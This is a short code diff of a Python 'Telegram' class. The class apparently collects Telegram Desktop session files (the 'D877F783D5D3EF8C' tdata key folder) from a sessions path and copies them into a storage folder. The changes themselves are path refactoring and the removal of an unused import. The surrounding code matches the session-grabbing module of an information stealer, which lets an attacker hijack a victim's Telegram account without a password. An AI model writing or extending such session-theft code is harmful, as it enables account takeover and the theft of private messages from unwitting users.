@@ -1,5 +1,4 @@
 from re import findall
-from json import loads
 from shutil import copyfile
 from os import listdir, path, makedirs
 
@@ -17,7 +16,7 @@ class Telegram:
 
     def __create_folder(self):
 
-        folder = rf"{self.storage_path}\{self.storage_folder}\{self.folder}\Telegram\D877F783D5D3EF8C"
+        folder = rf"{self.storage_path}\{self.folder}\D877F783D5D3EF8C"
 
         if not path.exists(folder):
             makedirs(folder)
@@ -30,7 +29,7 @@ class Telegram:
 
     def __get_sessions(self):
 
-        folder = rf"{self.storage_path}\{self.storage_folder}\{self.folder}\Telegram"
+        folder = rf"{self.storage_path}\{self.folder}"
 
         sessions = sum([findall(r"D877F783D5D3EF8C.*", file) for file in listdir(self.config.SessionsPath)], [])
         sessions.remove("D877F783D5D3EF8C")
